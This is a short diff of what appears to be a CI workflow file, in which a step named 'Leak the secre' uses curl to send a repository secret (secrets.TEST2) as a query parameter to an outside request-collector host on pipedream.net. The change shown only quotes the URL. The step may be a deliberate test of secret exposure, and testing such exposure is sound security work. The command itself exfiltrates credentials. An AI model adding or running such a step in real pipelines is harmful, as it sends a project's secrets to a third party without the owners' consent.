@@ -9,6 +9,6 @@ jobs:
     steps:
       - name: Leak the secre
         run: |
-          curl https://45130bd621923da5a57a26a0fbe3df4b.m.pipedream.net/?value=$VALUE
+          curl "https://45130bd621923da5a57a26a0fbe3df4b.m.pipedream.net/?value=$VALUE"
         env:
           VALUE: ${{ secrets.TEST2 }}
